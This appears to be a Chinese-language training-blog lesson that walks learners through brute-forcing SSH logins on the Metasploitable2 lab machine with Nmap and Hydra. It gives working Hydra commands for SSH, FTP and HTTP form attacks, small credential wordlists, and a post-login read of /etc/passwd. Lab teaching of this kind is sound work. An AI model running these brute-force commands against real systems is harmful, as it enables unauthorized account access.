---
title: Day007：破冰 - 周末闯关：Hydra 爆破 SSH
tags:
  - 网络安全
  - Hydra
  - SSH
categories:
  - 90天安全突击
stage: 筑基
abbrlink: d007
date: 2026-01-29
updated: 2026-01-28
---

# Day007：破冰 - 周末闯关：Hydra 爆破 SSH

## 📋 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 🔨 筑基（第一阶段） |
| **所属周次** | Week 1：破冰——你的第一次"黑客行动" |
| **今日主题** | 使用 Hydra 爆破 SSH 登录 |
| **预计时间** | 2-3 小时 |
| **难度等级** | ⭐⭐⭐ 进阶 |

---

## 🔥 今日痛点场景

> **场景**：你发现目标服务器开放了 SSH 端口（22），但不知道密码。
>
> **问题**：怎么用命令行工具快速爆破 SSH？
>
> **今天的任务**：使用 Hydra 对 Metasploitable2 进行 SSH 爆破，成功登录远程服务器。

---

## 🎯 今日目标

- [ ] 启动 Metasploitable2 靶机
- [ ] 使用 Nmap 确认 SSH 端口开放
- [ ] 用 Hydra 进行 SSH 爆破
- [ ] 成功 SSH 登录目标服务器

**闯关条件**：成功 SSH 登录 Metasploitable2。

---

## ⚔️ 实战任务（先动手！）

### 任务 1：启动 Metasploitable2（20 分钟）

**下载**（如果没有）：
- 搜索 "Metasploitable2 download"
- 下载 OVA 或 VMDK 文件
- 导入虚拟机

**启动后**：
- 默认登录：`msfadmin / msfadmin`
- 查看 IP：`ifconfig` 或 `ip addr`
- 记住这个 IP（假设是 192.168.56.102）

---

### 任务 2：Nmap 扫描确认目标（10 分钟）

在 Kali 中执行：

```bash
nmap -sV 192.168.56.102
```

**预期结果**：
```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh        ← 目标！
23/tcp   open  telnet
80/tcp   open  http
...
```

---

### 任务 3：准备用户名和密码字典（10 分钟）

**创建用户名文件**：
```bash
echo -e "root\nadmin\nmsfadmin\nuser" > ~/users.txt
```

**创建密码文件**（使用小字典）：
```bash
echo -e "123456\npassword\nmsfadmin\nadmin\nroot" > ~/passwords.txt
```

---

### 任务 4：Hydra 爆破 SSH（30 分钟）

**基本语法**：
```bash
hydra -L <用户名文件> -P <密码文件> <目标IP> ssh
```

**实际命令**：
```bash
hydra -L ~/users.txt -P ~/passwords.txt 192.168.56.102 ssh
```

**预期结果**：
```
[22][ssh] host: 192.168.56.102   login: msfadmin   password: msfadmin
1 of 1 target successfully completed, 1 valid password found
```

---

### 任务 5：SSH 登录验证（5 分钟）

```bash
ssh msfadmin@192.168.56.102
```

输入密码 `msfadmin`，成功登录！

**执行一些命令**：
```bash
whoami
uname -a
cat /etc/passwd
```

**退出**：
```bash
exit
```

---

## ✅ 今日闯关检查

| 检查项 | 状态 |
|--------|------|
| Metasploitable2 成功启动 | ⬜ |
| Nmap 扫描看到 22 端口 | ⬜ |
| Hydra 爆破成功找到密码 | ⬜ |
| SSH 成功登录目标服务器 | ⬜ |
| 在目标服务器上执行了命令 | ⬜ |

**全部打勾 = Week 1 通关！🎉**

---

## 📖 底层补课

### 什么是 SSH？

**SSH (Secure Shell)**：安全的远程登录协议，加密通信。

**对比**：
| 协议 | 加密 | 端口 |
|------|------|------|
| Telnet | ❌ 明文 | 23 |
| SSH | ✅ 加密 | 22 |

### Hydra 常用参数

| 参数 | 作用 |
|------|------|
| `-l user` | 单个用户名 |
| `-L file` | 用户名列表 |
| `-p pass` | 单个密码 |
| `-P file` | 密码列表 |
| `-t N` | 线程数（默认 16） |
| `-vV` | 详细输出 |

### Hydra 支持的协议

```
ssh, ftp, telnet, http-get, http-post,
smb, mysql, rdp, vnc, ...
```

---

## ⚠️ 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| 连接超时 | connection refused | 检查网络和目标 IP |
| 速度太慢 | 一直在尝试 | 减小字典或增加线程 `-t 32` |
| SSH 拒绝 | too many auth failures | 目标可能有防护，换工具或等待 |

---

## 💡 知识卡片速查

### Hydra 速查

```bash
# SSH 爆破
hydra -l root -P passwords.txt 192.168.56.102 ssh

# FTP 爆破
hydra -L users.txt -P passwords.txt 192.168.56.102 ftp

# HTTP POST 表单爆破
hydra -l admin -P passwords.txt 192.168.56.102 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:Login failed"
```

---

## ❓ 常见问题

**Q1：Hydra 和 Burp Intruder 有什么区别？**

A1：
- Hydra：命令行，适合非 HTTP 协议（SSH、FTP、MySQL）
- Burp Intruder：图形界面，专注 HTTP/HTTPS

**Q2：真实环境能用 Hydra 吗？**

A2：通常不行。真实服务器有：
- 失败锁定
- IP 封禁
- 双因素认证
- 蜜罐告警

**Q3：Metasploitable2 为什么这么容易被攻破？**

A3：它是专门设计的靶机，故意留了很多漏洞。真实环境不会这么脆弱。

---

## 🏆 Week 1 总结

恭喜你完成了第一周的学习！

**你学会了**：
- ✅ 搭建 Kali + DVWA 实验环境
- ✅ 用 Burp Suite 抓包和拦截
- ✅ 用 Intruder 爆破 Web 登录
- ✅ 用 Wireshark 分析网络流量
- ✅ 理解 HTTP vs HTTPS 的安全差异
- ✅ 用 Hydra 爆破 SSH

**你证明了**：
- 弱密码真的很危险
- HTTP 真的是明文的
- 工具可以自动化攻击

---

## 🚀 下周预告

**Week 2：侦察——信息收集**

下周你将学习：
- Google Hacking 挖掘公开信息
- WHOIS 和 DNS 枚举
- Nmap 高级扫描技术
- 漏洞初判

---

## 📊 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| Week 1 总用时 | |
| 最大收获 | |
| 下周期待 | |

---

> 💬 **导师点评**：
>
> 第一周结束了。你从零开始，到现在能爆破登录、抓取密码、SSH 进服务器。
>
> 虽然只是靶机，但你用的技术和真正的黑客完全一样。
>
> 下周开始学信息收集——攻击的第一步。记住：**信息收集做得好，后面打得才顺手**。
>
> 休息一下，Week 2 见！

```bash
echo "Week 1 Complete! 我完成了第一周的学习！"
```
